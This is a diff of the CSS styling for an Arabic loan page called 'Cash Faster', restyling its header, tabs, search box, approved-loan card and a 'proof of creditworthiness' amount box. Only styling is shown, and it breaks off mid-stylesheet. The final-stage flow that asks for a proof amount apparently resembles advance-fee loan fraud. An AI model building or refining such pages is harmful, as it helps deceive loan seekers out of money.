@@ -1,1378 +1,1253 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-<title>كاش فاستر | المرحلة النهائية - إثبات الجدارة الائتمانية</title>
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  :root {
-    --primary: #1A8C4A;
-    --primary-light: #E8F5EE;
-    --primary-dark: #0F6B38;
-    --gold: #B8912E;
-    --gold-light: #FBF6E8;
-    --gold-dark: #8E6F1F;
-    --purple: #7C3AED;
-    --purple-light: #EDE9FE;
-    --cyan: #0891B2;
-    --cyan-light: #CFFAFE;
-    --danger: #DC2626;
-    --danger-light: #FEE2E2;
-    --warning: #D97706;
-    --warning-light: #FEF3C7;
-    --info: #2563EB;
-    --info-light: #DBEAFE;
-    --bg: #F7F9FB;
-    --bg-card: #FFFFFF;
-    --bg-soft: #F0F4F8;
-    --text: #1A2332;
-    --text-muted: #6B7A8F;
-    --border: #E1E8F0;
-    --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
-    --shadow: 0 8px 32px rgba(26,35,50,0.08);
-    --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
-    --success: #16A34A;
-    --success-light: #DCFCE7;
-    --font: 'Cairo', sans-serif;
-    --radius-xl: 2rem;
-    --radius-lg: 1.4rem;
-    --radius-md: 1rem;
-    --radius-sm: 0.7rem;
-    --transition: 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-  }
-  body {
-    font-family: var(--font);
-    background: var(--bg);
-    color: var(--text);
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start;
-    padding: 0.8rem;
-    position: relative;
-    overflow-x: hidden;
-    line-height: 1.7;
-  }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>كاش فاستر | المرحلة النهائية - إثبات الجدارة الائتمانية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --emerald: #2ECC71;
+            --emerald-dark: #27AE60;
+            --emerald-glow: rgba(46, 204, 113, 0.35);
+            --gold: #D4AF37;
+            --gold-dark: #B8960F;
+            --gold-glow: rgba(212, 175, 55, 0.25);
+            --deep-blue: #0A0F1A;
+            --glass-bg: rgba(10, 15, 26, 0.85);
+            --glass-border: rgba(255, 255, 255, 0.06);
+            --text-light: #F8FAFC;
+            --text-muted: #8899AA;
+            --danger: #EF4444;
+            --warning: #FF8C42;
+            --shadow-card: 0 20px 60px rgba(0, 0, 0, 0.7);
+            --radius-xl: 2rem;
+            --radius-lg: 1.4rem;
+            --radius-md: 1rem;
+            --radius-sm: 0.7rem;
+            --transition: 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            --purple: #8B5CF6;
+            --purple-glow: rgba(139, 92, 246, 0.2);
+        }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--deep-blue);
+            color: var(--text-light);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0.8rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .bg-layer {
+            position: fixed; inset: 0; z-index: 0; pointer-events: none;
+            background:
+                radial-gradient(ellipse at 20% 30%, rgba(46, 204, 113, 0.05) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 70%, rgba(212, 175, 55, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(139, 92, 246, 0.03) 0%, transparent 60%);
+            animation: bgBreath 12s ease-in-out infinite alternate;
+        }
+        @keyframes bgBreath { 0% { opacity: 0.7; transform: scale(1); } 100% { opacity: 1; transform: scale(1.04); } }
+        .bg-grid {
+            position: fixed; inset: 0; z-index: 0; pointer-events: none;
+            background-image:
+                linear-gradient(rgba(46, 204, 113, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(46, 204, 113, 0.02) 1px, transparent 1px);
+            background-size: 64px 64px;
+            animation: gridSlide 30s linear infinite;
+        }
+        @keyframes gridSlide { 0% { transform: translate(0, 0); } 100% { transform: translate(64px, 64px); } }
 
-  /* ===== العلامة المائية ===== */
-  .watermark {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 0;
-    pointer-events: none;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  .watermark::before {
-    content: 'CASH FASTER';
-    position: absolute;
-    font-size: 9rem;
-    font-weight: 900;
-    color: rgba(26,140,74,0.045);
-    letter-spacing: 0.3rem;
-    transform: rotate(-32deg);
-    white-space: nowrap;
-    font-family: var(--font);
-  }
-  .watermark::after {
-    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';
-    position: absolute;
-    font-size: 1.6rem;
-    font-weight: 800;
-    color: rgba(184,145,46,0.04);
-    letter-spacing: 0.2rem;
-    transform: rotate(-32deg);
-    white-space: nowrap;
-    line-height: 5rem;
-    width: 200%;
-    text-align: center;
-    font-family: var(--font);
-  }
+        .app {
+            max-width: 520px; width: 100%;
+            background: var(--glass-bg);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border-radius: var(--radius-xl);
+            padding: 1.4rem 1.2rem;
+            box-shadow: var(--shadow-card), 0 0 80px rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1; overflow: hidden;
+        }
+        .app::before {
+            content: ''; position: absolute; inset: -50%;
+            background: radial-gradient(ellipse at 25% 20%, rgba(46, 204, 113, 0.04), transparent 55%);
+            pointer-events: none; z-index: 0;
+            animation: appGlow 30s linear infinite;
+        }
+        @keyframes appGlow { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.08); } 100% { transform: rotate(360deg) scale(1); } }
 
-  .bg-layer {
-    position: fixed; inset: 0; z-index: 0; pointer-events: none;
-    background:
-      radial-gradient(ellipse at 20% 30%, rgba(26,140,74,0.05) 0%, transparent 55%),
-      radial-gradient(ellipse at 80% 70%, rgba(184,145,46,0.05) 0%, transparent 50%),
-      radial-gradient(ellipse at 50% 50%, rgba(124,58,237,0.03) 0%, transparent 60%);
-    animation: bgBreath 12s ease-in-out infinite alternate;
-  }
-  @keyframes bgBreath { 0% { opacity: 0.7; transform: scale(1); } 100% { opacity: 1; transform: scale(1.04); } }
-  .bg-grid {
-    position: fixed; inset: 0; z-index: 0; pointer-events: none;
-    background-image:
-      linear-gradient(rgba(26,140,74,0.025) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(26,140,74,0.025) 1px, transparent 1px);
-    background-size: 64px 64px;
-    animation: gridSlide 30s linear infinite;
-  }
-  @keyframes gridSlide { 0% { transform: translate(0, 0); } 100% { transform: translate(64px, 64px); } }
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.2rem 0 0.8rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            position: relative; z-index: 2;
+        }
+        .brand {
+            display: flex; align-items: center; gap: 0.6rem;
+            text-decoration: none; cursor: pointer;
+        }
+        .brand .logo-wrap {
+            width: 46px; height: 46px;
+            background: linear-gradient(135deg, var(--gold), var(--emerald));
+            border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.5rem; font-weight: 900; color: #0A0F1A;
+            box-shadow: 0 0 30px var(--gold-glow), 0 0 60px rgba(46, 204, 113, 0.08);
+            transition: var(--transition);
+            position: relative; flex-shrink: 0;
+        }
+        .brand .logo-wrap:hover { transform: scale(1.05); box-shadow: 0 0 45px rgba(212, 175, 55, 0.35), 0 0 80px rgba(46, 204, 113, 0.12); }
+        .brand .logo-wrap .pulse-ring {
+            position: absolute; inset: -6px; border-radius: 18px;
+            border: 2px solid rgba(212, 175, 55, 0.15);
+            animation: ringPulse 2.5s ease-in-out infinite;
+        }
+        @keyframes ringPulse { 0%,100% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.15); opacity: 0; } }
+        .brand .text { display: flex; flex-direction: column; line-height: 1.1; }
+        .brand .text .main { font-size: 1.4rem; font-weight: 900; background: linear-gradient(135deg, #FFF, var(--emerald), var(--gold)); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 0.5px; }
+        .brand .text .main span { color: var(--gold); -webkit-text-fill-color: var(--gold); }
+        .brand .text .sub { font-size: 0.55rem; color: var(--text-muted); letter-spacing: 1.5px; text-transform: uppercase; font-weight: 500; }
+        .header .right { display: flex; align-items: center; gap: 0.5rem; }
+        .header .badge-status {
+            background: rgba(46, 204, 113, 0.08);
+            border: 1px solid rgba(46, 204, 113, 0.12);
+            border-radius: 3rem;
+            padding: 0.25rem 0.9rem;
+            font-size: 0.6rem; color: var(--emerald);
+            display: flex; align-items: center; gap: 0.4rem;
+            font-weight: 600; backdrop-filter: blur(4px); white-space: nowrap;
+        }
+        .header .badge-status .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--emerald); animation: dotPulse 1.8s ease-in-out infinite; flex-shrink: 0; }
+        @keyframes dotPulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.2; transform: scale(0.7); } }
+        .header .support-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 3rem;
+            padding: 0.3rem 0.7rem;
+            font-size: 0.6rem; color: var(--text-muted);
+            cursor: pointer; transition: var(--transition);
+            display: flex; align-items: center; gap: 0.3rem;
+            font-family: 'Cairo', sans-serif; backdrop-filter: blur(4px); white-space: nowrap;
+        }
+        .header .support-btn:hover { background: rgba(255, 255, 255, 0.08); color: #FFF; border-color: rgba(255, 255, 255, 0.15); }
+        .header .support-btn i { color: var(--gold); font-size: 0.7rem; }
 
-  .app {
-    max-width: 520px; width: 100%;
-    background: var(--bg-card);
-    border-radius: var(--radius-xl);
-    padding: 1.4rem 1.2rem;
-    box-shadow: var(--shadow-lg);
-    border: 1px solid var(--border);
-    position: relative; z-index: 1; overflow: hidden;
-  }
+        .final-stage-banner {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.12), rgba(46, 204, 113, 0.08));
+            border: 2px solid var(--gold);
+            border-radius: 3rem;
+            padding: 0.5rem 1.2rem;
+            margin: 0.6rem 0 0.8rem 0;
+            text-align: center;
+            position: relative; z-index: 1;
+            animation: bannerPulse 2.5s ease-in-out infinite;
+            display: flex; align-items: center; justify-content: center; gap: 0.6rem; flex-wrap: wrap;
+        }
+        @keyframes bannerPulse { 0%,100% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.08); } 50% { box-shadow: 0 0 35px rgba(212, 175, 55, 0.2), 0 0 60px rgba(46, 204, 113, 0.05); } }
+        .final-stage-banner i { color: var(--gold); font-size: 1.2rem; }
+        .final-stage-banner .text { color: #FFF; font-size: 0.85rem; font-weight: 700; }
+        .final-stage-banner .text .hl-gold { color: var(--gold); font-weight: 800; }
+        .final-stage-banner .text .hl-emerald { color: var(--emerald); font-weight: 800; }
 
-  /* ===== الهيدر ===== */
-  .header {
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 0.2rem 0 0.8rem 0;
-    border-bottom: 1px solid var(--border);
-    position: relative; z-index: 2;
-  }
-  .brand {
-    display: flex; align-items: center; gap: 0.6rem;
-    text-decoration: none; cursor: pointer;
-  }
-  .brand .logo-wrap {
-    width: 46px; height: 46px;
-    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-    border-radius: 14px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 1.5rem; font-weight: 900; color: #FFFFFF;
-    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
-    transition: var(--transition);
-    position: relative; flex-shrink: 0;
-  }
-  .brand .logo-wrap:hover { transform: scale(1.05); box-shadow: 0 8px 28px rgba(26,140,74,0.35); }
-  .brand .logo-wrap .pulse-ring {
-    position: absolute; inset: -6px; border-radius: 18px;
-    border: 2px solid rgba(26,140,74,0.15);
-    animation: ringPulse 2.5s ease-in-out infinite;
-  }
-  @keyframes ringPulse { 0%,100% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.15); opacity: 0; } }
-  .brand .text { display: flex; flex-direction: column; line-height: 1.1; }
-  .brand .text .main {
-    font-size: 1.4rem; font-weight: 900;
-    color: var(--text); letter-spacing: 0.5px;
-  }
-  .brand .text .main span { color: var(--gold); }
-  .brand .text .sub { font-size: 0.55rem; color: var(--text-muted); letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600; }
-  .header .right { display: flex; align-items: center; gap: 0.5rem; }
-  .header .badge-status {
-    background: var(--success-light);
-    border: 1px solid rgba(22,163,74,0.2);
-    border-radius: 3rem;
-    padding: 0.25rem 0.9rem;
-    font-size: 0.6rem; color: var(--success);
-    display: flex; align-items: center; gap: 0.4rem;
-    font-weight: 700; white-space: nowrap;
-  }
-  .header .badge-status .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--success); animation: dotPulse 1.8s ease-in-out infinite; flex-shrink: 0; }
-  @keyframes dotPulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.7); } }
-  .header .support-btn {
-    background: var(--bg-soft);
-    border: 1px solid var(--border);
-    border-radius: 3rem;
-    padding: 0.3rem 0.7rem;
-    font-size: 0.6rem; color: var(--text-muted);
-    cursor: pointer; transition: var(--transition);
-    display: flex; align-items: center; gap: 0.3rem;
-    font-family: var(--font); white-space: nowrap;
-  }
-  .header .support-btn:hover { background: var(--primary-light); color: var(--primary-dark); border-color: rgba(26,140,74,0.2); }
-  .header .support-btn i { color: var(--gold); font-size: 0.7rem; }
+        .tabs {
+            display: flex; gap: 0.3rem;
+            margin: 0.6rem 0 1rem 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 3rem;
+            padding: 0.2rem;
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1;
+        }
+        .tabs .tab {
+            flex: 1; text-align: center; padding: 0.4rem 0.2rem;
+            border-radius: 3rem; font-size: 0.6rem; font-weight: 700;
+            color: var(--text-muted); cursor: default;
+            transition: var(--transition); background: transparent;
+        }
+        .tabs .tab.active { background: linear-gradient(135deg, var(--emerald), var(--emerald-dark)); color: #0A0F1A; box-shadow: 0 4px 20px rgba(46, 204, 113, 0.2); }
+        .tabs .tab i { margin-left: 0.3rem; }
 
-  .final-stage-banner {
-    background: linear-gradient(135deg, var(--gold-light), var(--primary-light));
-    border: 2px solid var(--gold);
-    border-radius: 3rem;
-    padding: 0.5rem 1.2rem;
-    margin: 0.6rem 0 0.8rem 0;
-    text-align: center;
-    position: relative; z-index: 1;
-    animation: bannerPulse 2.5s ease-in-out infinite;
-    display: flex; align-items: center; justify-content: center; gap: 0.6rem; flex-wrap: wrap;
-  }
-  @keyframes bannerPulse { 0%,100% { box-shadow: 0 0 15px rgba(184,145,46,0.08); } 50% { box-shadow: 0 0 35px rgba(184,145,46,0.2), 0 0 60px rgba(26,140,74,0.05); } }
-  .final-stage-banner i { color: var(--gold-dark); font-size: 1.2rem; }
-  .final-stage-banner .text { color: var(--text); font-size: 0.85rem; font-weight: 800; }
-  .final-stage-banner .text .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .final-stage-banner .text .hl-emerald { color: var(--primary-dark); font-weight: 800; }
+        .search-box {
+            display: flex; gap: 0.4rem;
+            margin-bottom: 1rem;
+            position: relative; z-index: 1;
+        }
+        .search-box input {
+            flex: 1; padding: 0.7rem 1.2rem;
+            border-radius: 3rem;
+            border: 2px solid var(--glass-border);
+            background: rgba(255, 255, 255, 0.03);
+            color: #FFF; font-size: 0.85rem; text-align: center;
+            font-family: 'Cairo', sans-serif;
+            transition: var(--transition); backdrop-filter: blur(4px);
+        }
+        .search-box input:focus { outline: none; border-color: var(--gold); box-shadow: 0 0 35px var(--gold-glow); }
+        .search-box input::placeholder { color: var(--text-muted); }
+        .search-box button {
+            padding: 0.7rem 1.2rem; border: none; border-radius: 3rem;
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #0A0F1A; font-weight: 800; font-size: 0.75rem;
+            font-family: 'Cairo', sans-serif; cursor: pointer;
+            transition: var(--transition);
+            display: flex; align-items: center; gap: 0.4rem;
+            box-shadow: 0 4px 25px var(--gold-glow);
+            white-space: nowrap; animation: btnGlow 2s ease-in-out infinite;
+        }
+        @keyframes btnGlow { 0%,100% { box-shadow: 0 4px 25px var(--gold-glow); } 50% { box-shadow: 0 4px 45px rgba(212, 175, 55, 0.5), 0 0 80px rgba(46, 204, 113, 0.1); } }
+        .search-box button:hover { transform: scale(1.03); box-shadow: 0 0 50px rgba(212, 175, 55, 0.5); }
+        .search-box button i { font-size: 1rem; }
 
-  .tabs {
-    display: flex; gap: 0.3rem;
-    margin: 0.6rem 0 1rem 0;
-    background: var(--bg-soft);
-    border-radius: 3rem;
-    padding: 0.25rem;
-    border: 1px solid var(--border);
-    position: relative; z-index: 1;
-  }
-  .tabs .tab {
-    flex: 1; text-align: center; padding: 0.4rem 0.2rem;
-    border-radius: 3rem; font-size: 0.6rem; font-weight: 700;
-    color: var(--text-muted); cursor: default;
-    transition: var(--transition); background: transparent;
-  }
-  .tabs .tab.active { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #FFFFFF; box-shadow: 0 4px 20px rgba(26,140,74,0.2); }
-  .tabs .tab i { margin-left: 0.3rem; }
+        #resultArea>*+* { margin-top: 0.8rem; }
 
-  /* ===== صندوق البحث ===== */
-  .search-box {
-    display: flex; gap: 0.4rem;
-    margin-bottom: 1rem;
-    position: relative; z-index: 1;
-  }
-  .search-box input {
-    flex: 1; padding: 0.7rem 1.2rem;
-    border-radius: 3rem;
-    border: 2px solid var(--border);
-    background: var(--bg-soft);
-    color: var(--text); font-size: 0.85rem; text-align: center;
-    font-family: var(--font); font-weight: 600;
-    transition: var(--transition);
-  }
-  .search-box input:focus { outline: none; border-color: var(--primary); background: #FFFFFF; box-shadow: 0 0 0 4px rgba(26,140,74,0.1); }
-  .search-box input::placeholder { color: var(--text-muted); font-weight: 400; }
-  .search-box button {
-    padding: 0.7rem 1.2rem; border: none; border-radius: 3rem;
-    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-    color: #FFFFFF; font-weight: 800; font-size: 0.75rem;
-    font-family: var(--font); cursor: pointer;
-    transition: var(--transition);
-    display: flex; align-items: center; gap: 0.4rem;
-    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
-    white-space: nowrap;
-  }
-  .search-box button:hover { transform: translateY(-2px); box-shadow: 0 10px 28px rgba(26,140,74,0.35); }
-  .search-box button i { font-size: 1rem; }
+        .loan-card {
+            background: linear-gradient(145deg, #0D1524, #080C1A);
+            border-radius: var(--radius-lg);
+            padding: 1.2rem 1rem;
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1; overflow: hidden;
+        }
+        .loan-card::after {
+            content: ''; position: absolute; top: -25%; right: -15%; width: 60%; height: 120%;
+            background: radial-gradient(ellipse, rgba(212, 175, 55, 0.04), transparent 70%);
+            pointer-events: none;
+        }
+        .loan-card .label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; text-align: center; }
+        .loan-card .amount { text-align: center; font-size: 2.5rem; font-weight: 900; color: #FFF; margin: 0.1rem 0; letter-spacing: 1px; position: relative; z-index: 1; }
+        .loan-card .amount .cur { font-size: 1.1rem; color: var(--text-muted); font-weight: 600; }
+        .loan-card .approved { text-align: center; font-size: 0.8rem; color: var(--gold); font-weight: 700; position: relative; z-index: 1; }
+        .loan-card .approved i { color: var(--gold); margin-left: 0.3rem; }
+        .loan-status { text-align: center; font-size: 0.7rem; margin-top: 0.2rem; font-weight: 600; }
+        .loan-status .s-pending { color: var(--gold); }
+        .loan-status .s-completed { color: var(--emerald); }
+        .loan-status .s-blocked { color: var(--danger); }
 
-  #resultArea>*+* { margin-top: 0.8rem; }
+        .loan-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 0.5rem; margin-top: 0.8rem; padding-top: 0.8rem;
+            border-top: 1px solid var(--glass-border);
+            position: relative; z-index: 1;
+        }
+        .loan-grid .item { text-align: center; background: rgba(255, 255, 255, 0.02); border-radius: var(--radius-sm); padding: 0.4rem 0.2rem; transition: var(--transition); }
+        .loan-grid .item:hover { background: rgba(255, 255, 255, 0.04); }
+        .loan-grid .item .lbl { font-size: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .loan-grid .item .val { font-size: 0.85rem; font-weight: 700; color: #FFF; margin-top: 0.1rem; }
+        .loan-grid .item .val.gold { color: var(--gold); }
+        .loan-grid .item .val.green { color: var(--emerald); }
+        .loan-grid .item .val.danger { color: var(--danger); }
 
-  /* ===== بطاقة القرض ===== */
-  .loan-card {
-    background: linear-gradient(145deg, #FFFFFF, #FAFCFE);
-    border-radius: var(--radius-lg);
-    padding: 1.2rem 1rem;
-    border: 1px solid var(--border);
-    position: relative; z-index: 1; overflow: hidden;
-    box-shadow: var(--shadow-sm);
-  }
-  .loan-card::after {
-    content: ''; position: absolute; top: -25%; right: -15%; width: 60%; height: 120%;
-    background: radial-gradient(ellipse, rgba(184,145,46,0.08), transparent 70%);
-    pointer-events: none;
-  }
-  .loan-card .label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; text-align: center; font-weight: 700; }
-  .loan-card .amount { text-align: center; font-size: 2.5rem; font-weight: 900; color: var(--primary-dark); margin: 0.1rem 0; letter-spacing: 1px; position: relative; z-index: 1; }
-  .loan-card .amount .cur { font-size: 1.1rem; color: var(--text-muted); font-weight: 700; }
-  .loan-card .approved { text-align: center; font-size: 0.8rem; color: var(--primary-dark); font-weight: 800; position: relative; z-index: 1; }
-  .loan-card .approved i { color: var(--primary); margin-left: 0.3rem; }
+        .status-bar {
+            display: flex; align-items: center; gap: 0.6rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-md);
+            padding: 0.5rem 0.8rem;
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1;
+        }
+        .status-bar .icon { width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; flex-shrink: 0; }
+        .status-bar .text { flex: 1; }
+        .status-bar .text .main { font-weight: 700; font-size: 0.85rem; }
+        .status-bar .text .sub { font-size: 0.6rem; color: var(--text-muted); }
+        .status-bar .badge { border-radius: 3rem; padding: 0.15rem 0.7rem; font-size: 0.55rem; font-weight: 700; }
+        .status-bar.danger .icon { background: rgba(239, 68, 68, 0.12); color: var(--danger); }
+        .status-bar.danger .badge { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.15); color: var(--danger); }
+        .status-bar.success .icon { background: rgba(46, 204, 113, 0.12); color: var(--emerald); }
+        .status-bar.success .badge { background: rgba(46, 204, 113, 0.08); border: 1px solid rgba(46, 204, 113, 0.15); color: var(--emerald); }
+        .status-bar.warning .icon { background: rgba(212, 175, 55, 0.12); color: var(--gold); }
+        .status-bar.warning .badge { background: rgba(212, 175, 55, 0.08); border: 1px solid rgba(212, 175, 55, 0.15); color: var(--gold); }
 
-  .loan-grid {
-    display: grid; grid-template-columns: repeat(3, 1fr);
-    gap: 0.5rem; margin-top: 0.8rem; padding-top: 0.8rem;
-    border-top: 1px dashed var(--border);
-    position: relative; z-index: 1;
-  }
-  .loan-grid .item { text-align: center; background: var(--bg-soft); border-radius: var(--radius-sm); padding: 0.4rem 0.2rem; transition: var(--transition); }
-  .loan-grid .item:hover { background: var(--primary-light); }
-  .loan-grid .item .lbl { font-size: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; font-weight: 700; }
-  .loan-grid .item .val { font-size: 0.85rem; font-weight: 800; color: var(--text); margin-top: 0.1rem; }
-  .loan-grid .item .val.gold { color: var(--gold-dark); }
-  .loan-grid .item .val.green { color: var(--primary-dark); }
-  .loan-grid .item .val.danger { color: var(--danger); }
+        .proof-section {
+            background: linear-gradient(145deg, #0D1524, #080C1A);
+            border-radius: var(--radius-lg);
+            padding: 1.2rem 1rem;
+            border: 2px solid var(--purple);
+            position: relative; z-index: 1; overflow: hidden;
+        }
+        .proof-section::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(139, 92, 246, 0.04), transparent, rgba(212, 175, 55, 0.03), transparent);
+            animation: rotateGlow 12s linear infinite;
+        }
+        @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-  /* ===== صورة التحقق من الهوية ===== */
-  .id-verification {
-    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
-    border: 2px solid var(--gold);
-    border-radius: var(--radius-lg);
-    padding: 1.1rem;
-    box-shadow: var(--shadow-sm);
-  }
-  .id-verification .idv-header {
-    display: flex; align-items: center; gap: 0.6rem;
-    margin-bottom: 0.8rem; padding-bottom: 0.6rem;
-    border-bottom: 1px solid rgba(184,145,46,0.2);
-  }
-  .id-verification .idv-header .idv-icon {
-    width: 38px; height: 38px;
-    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
-    border-radius: 10px;
-    display: flex; align-items: center; justify-content: center;
-    color: #FFFFFF; font-size: 1rem; flex-shrink: 0;
-  }
-  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); line-height: 1.3; }
-  .id-verification .idv-header p { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.1rem; }
-  .id-verification .idv-image-box {
-    background: #FFFFFF; border: 1px dashed var(--gold);
-    border-radius: var(--radius-sm); padding: 0.6rem;
-    text-align: center; overflow: hidden;
-  }
-  .id-verification .idv-image-box img {
-    max-width: 100%; height: auto;
-    border-radius: 0.6rem; display: block; margin: 0 auto;
-    max-height: 320px; object-fit: contain;
-  }
-  .id-verification .idv-image-box .idv-placeholder {
-    padding: 1.5rem 0.5rem; color: var(--text-muted);
-    font-size: 0.78rem; font-weight: 600;
-  }
-  .id-verification .idv-image-box .idv-placeholder i {
-    font-size: 2rem; color: var(--gold);
-    display: block; margin-bottom: 0.4rem;
-  }
-  .id-verification .idv-caption {
-    font-size: 0.68rem; color: var(--text-muted);
-    text-align: center; margin-top: 0.5rem; font-weight: 600;
-  }
+        .proof-header { text-align: center; position: relative; z-index: 1; }
+        .proof-header .icon-big { font-size: 3rem; color: var(--purple); display: block; animation: pulseProof 1.8s ease-in-out infinite; }
+        @keyframes pulseProof { 0%,100% { transform: scale(1); text-shadow: 0 0 20px rgba(139, 92, 246, 0.1); } 50% { transform: scale(1.06); text-shadow: 0 0 40px rgba(139, 92, 246, 0.25); } }
+        .proof-header h2 { color: var(--purple); font-size: 1.3rem; font-weight: 800; }
+        .proof-header .sub { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.1rem; }
 
-  /* ===== قسم الإثبات ===== */
-  .proof-section {
-    background: linear-gradient(145deg, #FFFFFF, #FAFAFE);
-    border-radius: var(--radius-lg);
-    padding: 1.2rem 1rem;
-    border: 2px solid var(--purple);
-    position: relative; z-index: 1; overflow: hidden;
-    box-shadow: var(--shadow-sm);
-  }
-  .proof-header { text-align: center; position: relative; z-index: 1; }
-  .proof-header .icon-big { font-size: 3rem; color: var(--purple); display: block; animation: pulseProof 1.8s ease-in-out infinite; }
-  @keyframes pulseProof { 0%,100% { transform: scale(1); text-shadow: 0 0 20px rgba(124,58,237,0.1); } 50% { transform: scale(1.06); text-shadow: 0 0 40px rgba(124,58,237,0.25); } }
-  .proof-header h2 { color: var(--purple); font-size: 1.3rem; font-weight: 900; }
-  .proof-header .sub { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.1rem; }
+        .proof-amount-box {
+            background: rgba(139, 92, 246, 0.06);
+            border: 2px solid var(--purple);
+            border-radius: var(--radius-md);
+            padding: 1rem; margin: 0.6rem 0;
+            text-align: center; position: relative; z-index: 1;
+        }
+        .proof-amount-box .label { font-size: 0.7rem; color: var(--text-muted); font-weight: 600; letter-spacing: 0.5px; }
+        .proof-amount-box .value { font-size: 2.8rem; font-weight: 900; color: var(--purple); text-shadow: 0 0 30px rgba(139, 92, 246, 0.15); line-height: 1.2; }
+        .proof-amount-box .value .cur { font-size: 1.2rem; color: var(--text-muted); font-weight: 600; }
+        .proof-amount-box .note { font-size: 0.65rem; color: var(--text-muted); margin-top: 0.1rem; }
+        .proof-amount-box .note .hl-gold { color: var(--gold); font-weight: 700; }
+        .proof-amount-box .note .hl-emerald { color: var(--emerald); font-weight: 700; }
+        .proof-amount-box .note .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .proof-amount-box {
-    background: var(--purple-light);
-    border: 2px solid var(--purple);
-    border-radius: var(--radius-md);
-    padding: 1rem; margin: 0.6rem 0;
-    text-align: center; position: relative; z-index: 1;
-  }
-  .proof-amount-box .label { font-size: 0.7rem; color: var(--text-muted); font-weight: 700; letter-spacing: 0.5px; }
-  .proof-amount-box .value { font-size: 2.8rem; font-weight: 900; color: var(--purple); line-height: 1.2; }
